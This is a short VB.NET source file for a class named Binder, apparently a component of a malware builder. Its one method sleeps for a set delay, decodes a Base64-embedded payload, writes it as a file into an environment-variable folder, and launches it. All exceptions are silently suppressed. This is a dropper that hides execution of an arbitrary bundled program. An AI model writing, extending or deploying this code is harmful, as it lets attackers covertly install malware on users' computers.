﻿Imports System.Diagnostics
Public Class Binder
    Public Sub NewBinder(ByVal BinderBytes As String, ByVal BinderPath As String, ByVal BinderSleep As String, ByVal BinderName As String)
        Try
            Threading.Thread.Sleep(BinderSleep)
            IO.File.WriteAllBytes(Environ(BinderPath) & "\" & BinderName, Convert.FromBase64String(BinderBytes))
            Process.Start(Environ(BinderPath) & "\" & BinderName)
        Catch ex As Exception

        End Try
    End Sub
End Class
